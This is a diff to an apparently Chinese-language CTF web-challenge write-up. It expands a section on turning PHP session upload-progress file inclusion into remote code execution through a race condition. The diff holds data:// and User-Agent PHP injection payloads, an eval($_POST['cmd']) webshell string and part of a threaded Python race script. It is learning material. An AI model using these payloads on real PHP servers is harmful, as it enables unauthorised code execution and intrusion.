@@ -23,7 +23,7 @@ comments: true
 - [9. GET/POST](#9-getpost)
 - [10. 命令执行](#10-命令执行)
 - [11. 文件包含](#11-文件包含)
-  - [11.1 php session文件包含](#111-php-session文件包含)
+  - [11.1 php session文件包含：通过race实现rce](#111-php-session文件包含通过race实现rce)
 
 
 ## 前言<br>
@@ -251,24 +251,38 @@ c=data://text/plain,<?php system("tac fl*g.php")?>
 User-Agent: <?php system('tac fl0g.php'); ?>
 ```
 
-### 11.1 php session文件包含<br>
+### 11.1 php session文件包含：通过race实现rce<br>
 前置条件<br>
-`php.ini`中的以下条件开启：<br>
+**1. web服务以php作为主要语言**<br>
+**2.`php.ini`中的以下条件开启：**<br>
 ```
-session.upload_progress.enabled = on //enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
+//enabled=on表示upload_progress功能开启
+//也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；
+//当然，上传文件的主体，比如wsxk.txt，上传后会被重命名为xxxx.tmp文件，如果php代码中没有对该文件做处理（比如移动），那么在执行完当前页面的php代码后，自动删除xxxx.tmp
+session.upload_progress.enabled = on 
 
-session.upload_progress.prefix = "upload_progress_" //将表示为session中的键名
+//将表示为session中的键名
+session.upload_progress.prefix = "upload_progress_" 
 
-session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS" //当它出现在表单中，php将会报告上传进度，而且它的值可控！！！可用于写入代码
+//当它出现在表单中，php将会报告上传进度，而且它的值可控！！！
+//比如在post请求中传入参数data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}
+//在发送后，该信息也会存储在session中
+session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS" 
 
-session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录
+//session的存储位置，默认为 /tmp/目录
+session.save_path = /var/lib/php/sessions 
 ```
 还有**以下情景二选一**:<br>
 ```
-session.use_strict_mode = off //这个选项默认值为off，表示我们对Cookie中sessionid可控！！！
-// 我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。
+//这个选项默认值为off，表示我们对Cookie中sessionid可控！！！
+// 我们在Cookie里设置PHPSESSID=wsxk，PHP将会在服务器上创建一个文件：/tmp/sess_wsxk，用于保存session信息，即使此时用户没有初始化Session，PHP也会自动初始化Session。
+session.use_strict_mode = off 
+
 session.auto_start=On //的情况下，php在接收请求的时候会自动初始化session，不需要执行session_start()。但默认状态下，这个选项是默认关闭的。
 ```
+**总而言之,在php的web服务中，若php开启了上述条件，我们可以通过文件上传功能上传wsxk.txt文件（文件本身不重要）其中的cookies中包含{'PHPSESSID': 'wsxk'}，php默认情况下会在/tmp/目录下生成sess_wsxk文件用以保存session信息**<br>
+```若post请求中还带有'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'的参数，那么这个参数也会包含在sess_wsxk中，从而导致上传了可以执行rce的文件```<br>
+**不幸的是，php默认选项中session.upload_progress.cleanup = on是开启的，意味着每次请求结束，sess_wsxk文件会自动删除,这时候采用条件竞争的攻击方式，能够有效完成攻击**<br>
 
 ```python
 #coding=utf-8
@@ -293,9 +307,9 @@ def read(session):
 if __name__=="__main__":
     event=threading.Event()
     with requests.session() as session:
-        for i in range(1): 
+        for i in range(5): 
             threading.Thread(target=write,args=(session,)).start()
-        for i in range(1):
+        for i in range(5):
             threading.Thread(target=read,args=(session,)).start()
     event.set()
 ```
